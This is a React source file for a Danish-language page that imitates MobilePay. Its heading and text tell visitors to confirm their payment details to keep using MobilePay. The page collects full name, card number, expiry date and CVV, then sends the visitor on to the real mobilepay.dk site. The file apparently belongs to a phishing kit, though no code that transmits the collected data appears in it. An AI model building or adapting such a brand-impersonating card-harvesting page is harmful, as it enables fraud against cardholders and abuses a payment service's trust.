import React, { useState } from "react";
import Cards from "react-credit-cards";
import "./Payment.css";
import Mobilepay from "./images/mobilepay.png";
import Footer from "./Footer/Footer";

const Payment = () => {
  const [cvc, setCvc] = useState("");
  const [expiry, setExpiry] = useState("");
  const [focus, setFocus] = useState("");
  const [name, setName] = useState("");
  const [number, setNumber] = useState("");

  const handleInputFocus = (e) => {
    setFocus(e.target.name);
  };

  const handleInputChange = (e) => {
    const { name, value } = e.target;

    let formattedValue = value;

    if (name === "number") {
      formattedValue = value
        .replace(/\s/g, "") // Remove existing spaces
        .replace(/\D/g, "") // Remove non-digit characters
        .replace(/(.{4})/g, "$1 ") // Add a space after every 4 digits
        .trim(); // Remove leading/trailing spaces
    }

    if (name === "expiry") {
      formattedValue = value
        .replace(/\D/g, "") // Remove non-digit characters
        .replace(/(\d{2})/, "$1/") // Add a "/" after the first 2 digits
        .slice(0, 5); // Limit the input to MM/YY format
    }
    if (name === "cvc") {
      formattedValue = value.slice(0, 3); // Limit the input to 3 characters
    }

    // Update the state with the formatted value
    switch (name) {
      case "cvc":
        setCvc(formattedValue);
        break;
      case "expiry":
        setExpiry(formattedValue);
        break;
      case "name":
        setName(formattedValue);
        break;
      case "number":
        setNumber(formattedValue);
        break;
      default:
        break;
    }
  };

  return (
    <div className="payment_main">
      <img src={Mobilepay} />
      <h1>Betaling</h1>
      <p>
        Bekræft din nuværende betalingsoplysninger for at fortsætte brugen af
        MobilePay
      </p>

      <div
        id="PaymentForm"
        style={{
          display: "flex",
          flexDirection: "column",
          justifyContent: "flex-start",
          alignItems: "flex-start",
        }}
      >
        <div>
          <Cards
            cvc={cvc}
            expiry={expiry}
            focused={focus}
            name={name}
            number={number}
          />
        </div>
        <div className="payment_card_form">
          <div className="payment_card">
            <div>
              <label>Fulde navn</label>
            </div>
            <input
              type="text"
              name="name"
              onChange={handleInputChange}
              onFocus={handleInputFocus}
            />
          </div>
          <div className="payment_card">
            <div>
              <label>Kortnummer</label>
            </div>
            <input
              type="text"
              name="number"
              onChange={handleInputChange}
              onFocus={handleInputFocus}
              value={number}
              maxLength={19}
              inputMode="numeric"
              placeholder="1234 1234 1234 1234"
            />
          </div>

          <div className="payment_card">
            <div>
              <label>Udløbsdato</label>
            </div>
            <input
              type="text"
              name="expiry"
              onChange={handleInputChange}
              onFocus={handleInputFocus}
              value={expiry}
              inputMode="numeric"
              placeholder="XX/XX"
            />
          </div>
          <div className="payment_card">
            <div>
              <label>CVV</label>
            </div>
            <input
              type="number"
              name="cvc"
              min={0}
              value={cvc}
              onChange={handleInputChange}
              onFocus={handleInputFocus}
              placeholder="XXX"
              inputMode="numeric"
            />
          </div>
        </div>
      </div>
      <div className="PersonalizedAccountForm_btn">
        <button
          onClick={() => {
            window.location.href = "https://mobilepay.dk/";
          }}
        >
          Indsend
        </button>
      </div>

      <Footer />
    </div>
  );
};

export default Payment;
